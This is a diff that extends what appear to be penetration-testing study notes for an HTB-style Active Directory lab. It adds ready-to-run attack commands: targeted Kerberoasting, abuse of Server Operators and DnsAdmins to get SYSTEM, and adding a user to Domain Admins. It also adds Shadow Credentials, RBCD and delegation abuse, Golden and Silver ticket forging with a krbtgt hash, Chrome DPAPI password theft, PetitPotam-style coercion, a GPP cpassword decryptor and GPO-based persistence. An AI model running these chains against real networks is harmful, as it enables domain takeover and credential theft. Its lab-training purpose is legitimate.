@@ -28,6 +28,11 @@ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
 ```
 sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
 ```
+## Targeted Kerberoasting
+Everything above needs a user that already has an SPN set. If our current user has GenericWrite/GenericAll over a user with no SPN, we can set one ourselves, roast it, then clean up automatically:
+```
+targetedKerberoast.py -d INLANEFREIGHT.LOCAL -u forend -p Klmcargo2
+```
 # Credentialed Enumeration - from Linux
 ## CrackMapExec
 ### Domain User Enumeration
@@ -171,6 +176,15 @@ PS C:\htb> Get-ADGroup -Identity "Backup Operators"
 ```
 PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
 ```
+#### What These Groups Are Actually Worth
+Finding membership in one of these built-in groups is only half the job — know what it converts to. Server Operators can log on locally to a Domain Controller and reconfigure any service there, which is a straight path to SYSTEM:
+```
+PS C:\htb> sc.exe config <vulnerable-service> binpath= "cmd.exe /c net localgroup administrators forend /add"
+```
+```
+PS C:\htb> sc.exe start <vulnerable-service>
+```
+Print Operators is not the same primitive — it doesn't get general service rights, just `SeLoadDriverPrivilege`. That's still a SYSTEM path, but via loading a kernel driver (a known-vulnerable signed driver, Capcom.sys-style) rather than the `sc config` trick above.
 ## PowerView
 ### Domain User Information (mmorgan example)
 PS C:\htb> Get-DomainUser -Identity sflowers -Domain outdated.htb | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
@@ -348,6 +362,14 @@ Using the -ResolveGUIDs Flag for readable format
 ```
 PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
 ```
+### bloodyAD
+PowerView needs a Windows foothold; bloodyAD does the same ACL enumeration and abuse (group add, password reset, DCSync grant, SPN set) straight from Linux over LDAP:
+```
+bloodyAD --host 172.16.5.5 -d INLANEFREIGHT.LOCAL -u forend -p Klmcargo2 get writable --detail
+```
+```
+bloodyAD --host 172.16.5.5 -d INLANEFREIGHT.LOCAL -u forend -p Klmcargo2 add groupMember "Domain Admins" forend
+```
 ### Creating a List of Domain Users
 ```
 PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
@@ -377,6 +399,71 @@ PS C:\> net group "Exchange Windows Permissions" /add <user>
 ### WriteDacl
 ```
 Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PincipalIndentity <useraddedtogroupwithWriteDaclprivleges> DCSync
+```
+### Account Operators -> DCSync (a concrete chain)
+The two bullets above aren't hypothetical — Account Operators is a common starting point for exactly this chain: Account Operators can add itself to Exchange Windows Permissions (the group referenced above), which by default holds WriteDacl on the domain object, which is then used to grant the compromised user DCSync rights.
+```
+net group "Exchange Windows Permissions" /add forend /domain
+```
+```
+Add-DomainObjectAcl -TargetIdentity "DC=INLANEFREIGHT,DC=LOCAL" -PrincipalIdentity forend -Rights DCSync
+```
+From here, proceed straight to the DCSync section below.
+## Shadow Credentials
+Abuses write access to a principal's `msDS-KeyCredentialLink` attribute to add an attacker-controlled certificate for PKINIT, then converts that into the account's NT hash (UnPAC-the-Hash) — no password reset needed.
+Windows, with Whisker:
+```
+Whisker.exe add /target:forend
+```
+```
+Rubeus.exe asktgt /user:forend /certificate:<base64-cert> /password:<cert-password> /getcredentials
+```
+Linux, with Certipy — one command does both the KeyCredentialLink write and the PKINIT/UnPAC-the-Hash conversion:
+```
+certipy shadow auto -u forend@inlanefreight.local -p Klmcargo2 -account targetuser
+```
+## Resource-Based Constrained Delegation (RBCD)
+Needs GenericAll/GenericWrite over a computer object (or the ability to add a computer account, if `ms-DS-MachineAccountQuota` allows it).
+Windows:
+```
+New-MachineAccount -MachineAccount ATTACKERSYSTEM -Password $(ConvertTo-SecureString 'Passwd123!' -AsPlainText -Force)
+```
+```
+Set-DomainRBCD -Identity TARGET-COMPUTER$ -DelegateFrom ATTACKERSYSTEM$
+```
+```
+Rubeus.exe s4u /user:ATTACKERSYSTEM$ /rc4:<attackersystem_nthash> /impersonateuser:administrator /msdsspn:cifs/target-computer.inlanefreight.local /ptt
+```
+Linux — same idea with impacket/bloodyAD:
+```
+addcomputer.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -computer-name ATTACKERSYSTEM$ -computer-pass Passwd123!
+```
+```
+impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TARGET-COMPUTER$' -action write INLANEFREIGHT.LOCAL/forend:Klmcargo2
+```
+```
+getST.py -spn cifs/target-computer.inlanefreight.local -impersonate administrator INLANEFREIGHT.LOCAL/ATTACKERSYSTEM\$:Passwd123!
+```
+## Unconstrained Delegation
+A computer trusted for unconstrained delegation caches any TGT that authenticates to it, including a Domain Controller's if we can coerce one. Find unconstrained-delegation hosts first:
+```
+Get-DomainComputer -Unconstrained | select name,dnshostname
+```
+Trigger the Printer Bug against a DC to make it authenticate to the unconstrained host, and catch the TGT with Rubeus:
+```
+Rubeus.exe monitor /interval:5 /filteruser:ACADEMY-EA-DC01$
+```
+```
+SpoolSample.exe ACADEMY-EA-DC01 UNCONSTRAINED-HOST.INLANEFREIGHT.LOCAL
+```
+Once Rubeus catches the DC's TGT, `/ptt` it and DCSync straight off it.
+## Constrained Delegation (S4U2)
+A service account with `msDS-AllowedToDelegateTo` set can impersonate any user to that specific SPN via S4U2Self + S4U2Proxy — no target password needed, just the service account's hash or Kerberos keys.
+```
+Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
+```
+```
+Rubeus.exe s4u /user:svc_mssql /rc4:<svc_mssql_nthash> /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
 ```
 # DCSync
 If we have a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set.  Domain/Enterprise Admins and default domain administrators have this right by default.
@@ -424,6 +511,30 @@ mimikatz # privilege::debug
 As for the user khartsfield, we can get the NTLM hash using the following command
 ```
 mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield
+```
+## Forging a Ticket After DCSync'ing krbtgt
+Once krbtgt's NT hash is DCSync'd, forge tickets directly instead of DCSync'ing every user one at a time. Golden Ticket (any user, any rights, domain-wide) from Linux:
+```
+ticketer.py -nthash 88ad09182de639ccc6579eb0849751cf -domain-sid S-1-5-21-2839110960-2093633156-2951976679 -domain INLANEFREIGHT.LOCAL administrator
+```
+```
+export KRB5CCNAME=administrator.ccache
+```
+Same from Windows, with Mimikatz:
+```
+mimikatz # kerberos::golden /user:administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-2839110960-2093633156-2951976679 /krbtgt:88ad09182de639ccc6579eb0849751cf /ptt
+```
+Silver Ticket is the quieter, narrower alternative — it only needs a *service* account's hash (not krbtgt), never touches the DC to validate, but only works against that one service:
+```
+mimikatz # kerberos::golden /user:administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-2839110960-2093633156-2951976679 /target:dc01.inlanefreight.local /service:cifs /rc4:<service_account_nthash> /ptt
+```
+## DPAPI Credential Extraction
+Chrome-saved passwords and other DPAPI-protected secrets are worth checking on any host we land on, DA or not:
+```
+mimikatz # dpapi::chrome /in:"C:\Users\forend\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+```
+mimikatz # dpapi::cred /in:C:\Users\forend\AppData\Roaming\Microsoft\Credentials\<blob>
 ```
 # Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?
 ## RDP
@@ -493,6 +604,18 @@ enable_xp_cmdshell
 Enumerating our Rights on the System using xp_cmdshell
 ```
 xp_cmdshell whoami /priv
+```
+### Linked Server Abuse
+If xp_cmdshell isn't available (or we want to move to a different SQL instance), check for linked servers first — they're a common way to pivot between instances using existing trust rather than needing new creds.
+```
+Get-SQLServerLink -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!"
+```
+```
+Get-SQLServerLinkCrawl -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -Query "select 1"
+```
+Manually, the same pivot is just a nested `OPENQUERY` call executed against the linked server through our current connection:
+```
+SELECT * FROM OPENQUERY("LINKED-SQL01",'select * from openquery("LINKED-SQL02",''select 1'')')
 ```
 # NoPac (SamAccountName Spoofing)
 ```
@@ -575,6 +698,18 @@ python3 PetitPotam.py <attack host IP> <Domain Controller IP>
 ```
 ```
 python3 PetitPotam.py 172.16.5.225 172.16.5.5
+```
+### Other Coercion Vectors
+PetitPotam gets patched host-by-host, so it's worth having alternates. DFSCoerce (MS-DFSNM) and netexec's built-in `coerce_plus` module both trigger the same style of forced authentication:
+```
+python3 DFSCoerce.py -u forend -p Klmcargo2 172.16.5.225 172.16.5.5
+```
+```
+netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M coerce_plus -o LISTENER=172.16.5.225
+```
+Scan for hosts worth targeting first — Spooler and EFS both need to be running for these to work:
+```
+netexec smb 172.16.5.0/23 -u forend -p Klmcargo2 -M spooler
 ```
 ## Windows
 ### Mimikatz
@@ -661,6 +796,18 @@ If we run again with the -r flag the tool will attempt to resolve unknown record
 ```
 adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
 ```
+## DnsAdmins Group Membership
+Membership in DnsAdmins lets us set a custom DLL to be loaded by the DNS service (which runs as SYSTEM on a DC) the next time it restarts.
+```
+dnscmd.exe /config /serverlevelplugindll \\172.16.5.225\share\mydll.dll
+```
+```
+sc.exe \\ACADEMY-EA-DC01 stop dns
+```
+```
+sc.exe \\ACADEMY-EA-DC01 start dns
+```
+The DLL runs as SYSTEM on the DC as soon as the service comes back up. From Linux, the same config-write is available via `netexec`'s `dnsadmin` module or `dnstool.py`.
 ## Password in Description Field
 ### Finding Passwords in the Description Field using Get-Domain User
 ```
@@ -694,6 +841,27 @@ gpp_password
 ```
 ```
 crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+```
+### Manual Decryption
+No tool needed — cpassword is AES-encrypted with a static key Microsoft published in MS14-025, so it decrypts with a few lines of PowerShell:
+```powershell
+function Decrypt-GPPPassword {
+    param([string]$Cpassword)
+    $Mod = ($Cpassword.Length % 4)
+    if ($Mod -ne 0) { $Cpassword += ("=" * (4 - $Mod)) }
+    $Key = [Byte[]] (0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+    $Base64 = [Convert]::FromBase64String($Cpassword.Replace("-","+").Replace("_","/"))
+    $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+    $AES.Key = $Key; $AES.IV = New-Object Byte[] 16
+    ($AES.CreateDecryptor()).TransformFinalBlock($Base64,0,$Base64.Length) | ForEach-Object { [System.Text.Encoding]::Unicode.GetString($_) }
+}
+```
+Find the cpassword to feed it first — every GPP XML that stores one lives under SYSVOL. Pull the Policies tree down over SMB, then grep it locally:
+```
+smbclient //172.16.5.5/SYSVOL -U forend%Klmcargo2 -c 'prompt off; recurse on; cd INLANEFREIGHT.LOCAL\Policies; mget *'
+```
+```
+grep -irl cpassword ./Policies/ 2>/dev/null
 ```
 ## ASREPRoasting
 ### Windows
@@ -753,4 +921,15 @@ If we select the GPO in BloodHound and scroll down to Affected Objects on the No
 Use a tool such as SharpGPOAbuse to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell
 ```
 https://github.com/FSecureLABS/SharpGPOAbuse
+```
+Concrete syntax for the two actions mentioned above:
+```
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount forend --GPOName "Disconnect Idle RDP"
+```
+```
+SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author INLANEFREIGHT\forend --Command "cmd.exe" --Arguments "/c net localgroup administrators forend /add" --GPOName "Disconnect Idle RDP"
+```
+Either way, force a GPO update on the target rather than waiting for the ~90 minute refresh cycle:
+```
+gpupdate /force
 ```
